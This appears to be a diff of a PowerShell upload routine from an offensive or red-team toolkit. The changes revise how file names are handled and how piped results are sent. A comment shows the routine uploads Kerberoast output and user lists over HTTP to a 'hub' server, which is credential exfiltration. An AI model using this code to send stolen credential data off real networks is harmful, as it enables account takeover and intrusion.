@@ -266,7 +266,11 @@ function Send-File {
 
     if ($FileName) {
         # remove path
-        $FileName = (Get-Item $Filename).Name
+        try {
+            $FileName = (Get-Item $Filename).Name
+        } catch [System.Management.Automation.ItemNotFoundException] {
+            $FileName = $FileName.Replace('^.', '').Replace('\', '_')
+        }
     } else {
         $FileName = Get-Date -Format o
     }
@@ -324,7 +328,14 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
         $result = $result + $Stream
     }
     end {
-        if ($Files) {
+        if ($result) {
+            if ($result.length -eq 1 -and $result[0] -is [System.String]) {
+                Send-File $result[0] $Name
+            } else {
+                $Body = $result | ConvertTo-Json
+                Send-File $Body $Name
+            }
+        } else {
             ForEach ($file in $Files) {
                 $abspath = (Resolve-Path $file).path
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
@@ -335,14 +346,6 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 
                 Send-File $fileEnc $filename
 
-            }
-        } else {
-            if ($result.length -eq 1 -and $result[0] -is [System.String]) {
-                Send-File $result[0] $Name
-            } else {
-                write-host $result
-                $Body = $result | ConvertTo-Json
-                Send-File $Body $Name
             }
         }
     }
